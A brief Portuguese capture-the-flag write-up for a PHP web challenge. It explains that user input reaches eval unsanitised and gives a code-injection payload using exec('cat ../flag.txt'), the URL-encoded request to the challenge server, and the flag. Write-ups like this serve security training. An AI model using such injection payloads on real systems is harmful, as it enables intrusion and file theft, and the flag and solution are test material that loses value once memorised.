# **CTF**

## _CMD Injection II_

## Informações

| **Category:** | **Points:** |
| ------------- | ----------- |
| Web           | 500         |

**Descrição:**

> (é na verdade code injection)

> Flag em ../flag.txt.

> http://34.95.239.56:9988/ 

## Solução

Na documentação do PHP vemos que o eval executa uma string como código PHP. Como não há nenhum tipo de sanitização podemos montar o payload da seguinte forma.

`$cmd = "bom dia";echo exec('cat ../flag.txt'); //";`

Onde definimos uma variável qualquer e logo em seguida adicionamos o código malicioso.

Com URL encode a URL ficaria:
```
http://34.95.239.56:9988/?phpcode=%24cmd%20%3D%20"bom%20dia"%3Becho%20exec%28%27cat%20..%2Fflag.txt%27%29%3B%20%2F%2F"%3B
```
![](https://i.imgur.com/SDzW2My.png)


### Flag

> CTF-BR{CUiD@do_CoM_0_3v@L}
